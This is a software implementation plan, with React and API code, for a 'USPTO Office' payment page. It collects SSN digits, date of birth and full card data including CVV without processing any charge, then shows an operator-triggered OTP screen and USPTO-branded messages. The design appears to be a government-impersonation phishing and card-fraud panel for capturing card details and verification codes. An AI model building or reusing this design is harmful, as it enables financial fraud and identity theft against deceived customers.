# USPTO Office Manual Payment Feature - Implementation Plan

## Overview
Special brand "USPTO Office" with manual payment processing via OTP verification system.

## Feature Components

### 1. Brand Setup
- **Name**: USPTO Office
- **Special**: No merchants required (manual processing)
- **Flag**: `isManualPayment: true` in brand document

### 2. Payment Form (Customer Side)
**Additional Fields for USPTO Brand:**
- Last 4 digits SSN
- Date of Birth
- Card fields (name, number, expiry, CVV - stored but not processed)

**Flow:**
1. Customer fills form
2. Clicks "Pay"
3. Redirects to loading screen
4. Shows: "Processing your payment. You may need to verify with an OTP."
5. Invoice status changes to `payment_requested`

### 3. Invoice Table Updates (Admin Side)
**New Status**: `payment_requested` (yellow badge)

**New Action Buttons** (only for USPTO invoices):
- **Email OTP**: Opens modal to enter custom note → sends email OTP trigger
- **SMS OTP**: Opens modal to enter custom note → sends SMS OTP trigger

### 4. OTP Verification Screen (Customer Side)
When admin clicks OTP button:
1. Customer's loading screen updates
2. Shows: "OTP sent to your [email/text message]"
3. Displays admin's custom note
4. Shows OTP input field (6 digits)
5. Shows "Proceed" button
6. On proceed: validates OTP → marks invoice as paid

### 5. Database Changes

#### Brand Model Updates
```javascript
{
  name: "USPTO Office",
  isManualPayment: true,  // NEW FIELD
  requiresOTP: true,       // NEW FIELD
  // ... other fields
}
```

#### Invoice Model Updates
```javascript
{
  status: 'payment_requested',  // NEW STATUS
  otpStatus: 'pending',         // NEW: pending, email_sent, sms_sent, verified
  otpMethod: 'email',           // NEW: email or sms
  adminNote: '',                // NEW: Custom note from admin
  paymentData: {                // NEW: Store payment form data
    ssnLast4: '1234',
    dateOfBirth: '1990-01-01',
    cardData: {
      nameOnCard: 'John Doe',
      cardNumber: '************1234',
      expiry: '12/25',
      cvv: '***'
    }
  }
}
```

#### OTP Model (New)
```javascript
{
  invoiceId: 'inv_123',
  code: '123456',           // 6-digit code
  method: 'email',          // or 'sms'
  adminNote: 'Custom message from admin',
  expiresAt: '2024-01-01T12:00:00Z',
  used: false,
  createdAt: '2024-01-01T11:00:00Z'
}
```

### 6. API Endpoints

#### Customer Endpoints
```
POST /api/invoices/public/:id/submit-payment-request
- Submit payment form for USPTO brand
- Changes status to payment_requested
- Returns: { success: true, message: 'Waiting for verification' }

GET /api/invoices/public/:id/payment-status
- Check if OTP has been sent
- Returns: { 
    otpStatus: 'pending|email_sent|sms_sent', 
    otpMethod: 'email|sms',
    adminNote: 'Custom note'
  }

POST /api/invoices/public/:id/verify-otp
- Verify OTP code
- Body: { code: '123456' }
- Returns: { success: true, verified: true }
```

#### Admin Endpoints
```
POST /api/invoices/:id/send-otp-email
- Send email OTP to customer
- Body: { adminNote: 'Please verify with OTP' }
- Returns: { success: true, otpCode: '123456' }

POST /api/invoices/:id/send-otp-sms
- Send SMS OTP to customer
- Body: { adminNote: 'Please verify via text' }
- Returns: { success: true, otpCode: '123456' }
```

### 7. Frontend Components

#### A. PublicInvoice.jsx Updates
```javascript
// Detect USPTO brand
const isUSPTOBrand = invoice?.brand?.name === 'USPTO Office';

// Additional form fields
if (isUSPTOBrand) {
  return (
    <>
      <input name="ssnLast4" placeholder="Last 4 SSN" maxLength="4" />
      <input name="dateOfBirth" type="date" />
      {/* Standard card fields */}
    </>
  );
}

// Submit to different endpoint
const handleUSPTOPayment = async () => {
  await api.post(`/invoices/public/${invoiceId}/submit-payment-request`, formData);
  setStep('waiting-otp'); // New step
};
```

#### B. New Component: OTPWaitingScreen.jsx
```javascript
function OTPWaitingScreen({ invoiceId }) {
  const [status, setStatus] = useState(null);
  
  // Poll for OTP status
  useEffect(() => {
    const checkStatus = async () => {
      const res = await api.get(`/invoices/public/${invoiceId}/payment-status`);
      setStatus(res.data);
    };
    
    const interval = setInterval(checkStatus, 3000); // Check every 3 seconds
    return () => clearInterval(interval);
  }, []);
  
  if (!status || status.otpStatus === 'pending') {
    return <LoadingScreen message="Processing your payment. You may need to verify with an OTP." />;
  }
  
  if (status.otpStatus === 'email_sent' || status.otpStatus === 'sms_sent') {
    return <OTPInputScreen 
      method={status.otpMethod} 
      adminNote={status.adminNote}
      invoiceId={invoiceId}
    />;
  }
  
  return null;
}
```

#### C. New Component: OTPInputScreen.jsx
```javascript
function OTPInputScreen({ method, adminNote, invoiceId }) {
  const [otp, setOtp] = useState('');
  
  const handleVerify = async () => {
    const res = await api.post(`/invoices/public/${invoiceId}/verify-otp`, { code: otp });
    if (res.data.verified) {
      toast.success('Payment verified!');
      setStep('success');
    }
  };
  
  return (
    <div>
      <h2>OTP sent to your {method === 'email' ? 'email' : 'text message'}</h2>
      <p>{adminNote}</p>
      <input 
        type="text" 
        maxLength="6" 
        value={otp}
        onChange={(e) => setOtp(e.target.value)}
        placeholder="Enter 6-digit code"
      />
      <button onClick={handleVerify}>Proceed</button>
    </div>
  );
}
```

#### D. Invoices.jsx Updates
```javascript
// Add OTP action buttons for USPTO invoices
{invoice.brand?.name === 'USPTO Office' && invoice.status === 'payment_requested' && (
  <>
    <button onClick={() => handleEmailOTP(invoice)}>
      <Mail size={15} /> Email OTP
    </button>
    <button onClick={() => handleSMSOTP(invoice)}>
      <MessageSquare size={15} /> SMS OTP
    </button>
  </>
)}

// Modal for admin note
const [otpModal, setOtpModal] = useState({ open: false, method: '', invoiceId: null });
const [adminNote, setAdminNote] = useState('');

const handleEmailOTP = (invoice) => {
  setOtpModal({ open: true, method: 'email', invoiceId: invoice._id });
};

const sendOTP = async () => {
  await api.post(`/invoices/${otpModal.invoiceId}/send-otp-${otpModal.method}`, {
    adminNote
  });
  toast.success(`${otpModal.method.toUpperCase()} OTP sent to customer`);
  setOtpModal({ open: false, method: '', invoiceId: null });
  setAdminNote('');
};
```

### 8. Implementation Steps

**Phase 1: Backend Setup**
1. Add `isManualPayment` field to Brand model
2. Create USPTO Office brand
3. Add new invoice statuses: `payment_requested`
4. Create OTP database model
5. Add payment request endpoint
6. Add OTP send endpoints (email/sms)
7. Add OTP verification endpoint
8. Add payment status polling endpoint

**Phase 2: Frontend - Customer Side**
1. Detect USPTO brand in PublicInvoice
2. Add SSN Last 4 field
3. Add Date of Birth field
4. Keep card fields but don't process
5. Create OTPWaitingScreen component
6. Create OTPInputScreen component
7. Implement status polling
8. Handle OTP verification

**Phase 3: Frontend - Admin Side**
1. Add `payment_requested` status badge
2. Add Email OTP button
3. Add SMS OTP button
4. Create admin note modal
5. Implement OTP send functionality
6. Show OTP actions only for USPTO invoices

**Phase 4: Testing**
1. Create USPTO brand
2. Create invoice with USPTO brand
3. Fill payment form with SSN + DOB
4. Submit and verify loading screen
5. Admin sends Email OTP
6. Customer sees OTP screen
7. Enter OTP and verify
8. Invoice marked as paid

### 9. Security Considerations

**OTP Security:**
- 6-digit codes (100,000 - 999,999)
- 10-minute expiry
- One-time use only
- Store hashed in database

**Data Protection:**
- SSN Last 4: Encrypted at rest
- DOB: Encrypted at rest
- Card data: Masked (show only last 4)
- No actual card processing

**Access Control:**
- Only admins can send OTP
- Only matching invoice customer can verify
- Rate limiting on OTP requests

### 10. Email/SMS Templates

**Email OTP:**
```
Subject: USPTO Payment Verification Code

Dear [Customer Name],

Your USPTO payment verification code is: 123456

This code will expire in 10 minutes.

Admin Note: [Custom message from admin]

If you did not request this code, please ignore this email.
```

**SMS OTP:**
```
USPTO Payment Code: 123456
Expires in 10 minutes.

[Admin Note]
```

---

## Summary

This feature creates a manual payment processing system for USPTO Office brand that:
- Collects payment info without processing
- Requires admin-initiated OTP verification
- Supports both email and SMS OTP
- Allows custom admin notes to customer
- Provides real-time status updates

**Estimated Implementation Time**: 4-6 hours
**Complexity**: High
**Dependencies**: Email service, SMS service (optional)

---

**Next Steps**:
1. Review and approve this plan
2. Begin Phase 1 implementation
3. Test each phase before moving to next
4. Deploy and monitor

